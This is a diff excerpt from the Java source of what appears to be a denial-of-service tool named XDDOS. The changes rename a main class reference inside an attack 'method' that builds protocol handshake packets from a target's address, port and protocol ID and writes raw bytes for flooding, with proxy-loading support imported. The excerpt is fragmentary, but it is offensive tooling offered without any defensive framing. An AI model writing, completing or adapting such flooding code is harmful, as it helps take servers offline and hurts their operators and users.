@@ -1,6 +1,6 @@
     package XD.XDDOS.methods;
 
-    import XD.XDDOS.Main;
+    import XD.XDDOS.XDDOS;
     import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.PacketUtils;
@@ -23,7 +23,7 @@ import XD.XDDOS.utils.PacketUtils;
 
       implements Method{
 
-      private byte[] handshake = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2)).getWrappedPacket();
+      private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
       private volatile int i = 0;
       private static SecureRandom RANDOM = new SecureRandom();
     
@@ -83,7 +83,7 @@ import XD.XDDOS.utils.PacketUtils;
         out.write(0);
         out.write(-47);
         out.write(-9);
-        out.writeBytes(Main.srvRecord);
+        out.writeBytes(XDDOS.srvRecord);
         out.write(-99);
         out.write(-224);
         out.write(-1);
